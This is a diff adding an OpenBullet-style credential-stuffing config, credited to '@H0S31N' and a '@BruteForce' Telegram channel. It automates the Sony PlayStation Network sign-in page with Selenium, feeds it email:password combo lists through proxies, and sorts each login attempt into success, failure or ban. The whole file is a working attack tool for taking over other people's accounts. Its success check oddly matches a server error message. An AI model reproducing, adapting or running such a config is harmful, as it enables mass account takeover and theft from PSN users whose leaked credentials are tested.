@@ -1,0 +1,94 @@
+[SETTINGS]
+{
+  "Name": "Psn Selenium Config",
+  "SuggestedBots": 10,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-15T12:59:21.8361588-07:00",
+  "AdditionalInfo": "Telegram Channel: @BruteForce",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": true,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "incognito"
+}
+
+[SCRIPT]
+BROWSERACTION Open 
+
+NAVIGATE "https://id.sonyentertainmentnetwork.com/id/tv/signin/?/signin#/signin" 
+
+ELEMENTACTION Selector "#ember14" 
+  WaitForElement 
+
+ELEMENTACTION Selector "#ember14" 
+  Click 
+
+FUNCTION Delay "1500" 
+
+BROWSERACTION SendKeys "<USER>" 
+
+ELEMENTACTION Selector "#ember17" 
+  Click 
+
+FUNCTION Delay "1500" 
+
+BROWSERACTION SendKeys "<PASS>" 
+
+FUNCTION Delay "1500" 
+
+BROWSERACTION SendKeys "<ENTER>" 
+
+ELEMENTACTION Selector "#ember40" 
+  WaitForElement "10" 
+
+ELEMENTACTION Selector "#ember40" 
+  GetText -> VAR "C" 
+
+BROWSERACTION DOMtoSOURCE 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<C>" Contains "An error occurred during communication with the server." 
+  KEYCHAIN Failure OR 
+    KEY "<C>" Contains "The sign-in ID (email address) or password is not correct." 
+  KEYCHAIN Ban OR 
+    KEY "<C>" Contains "The connection to the server timed out." 
+    KEY "<C>" Contains "A connection to the server could not be established." 
+
